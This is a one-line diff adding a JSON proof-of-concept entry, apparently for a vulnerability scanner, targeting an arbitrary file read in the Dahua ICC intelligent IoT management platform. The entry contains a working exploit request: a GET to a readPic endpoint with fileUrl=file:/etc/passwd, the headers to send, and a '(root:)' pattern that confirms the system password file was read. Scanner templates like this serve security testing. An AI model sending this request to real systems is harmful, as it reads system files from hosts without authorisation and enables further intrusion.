@@ -1,0 +1,1 @@
+{	"name":"大华ICC智能物联综合管理平台文件读取",	"tag":"dahua",	"type":"other",	"poc":{		"pocGet":"/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd",		"header":{			"User-Agent":" Mozilla/5.0",			"Connection":" close",			"Accept-Encoding":" */*",			"Content-Length":" 29"		},	"status_code":"200",		"pattern":"(root:)"	}}
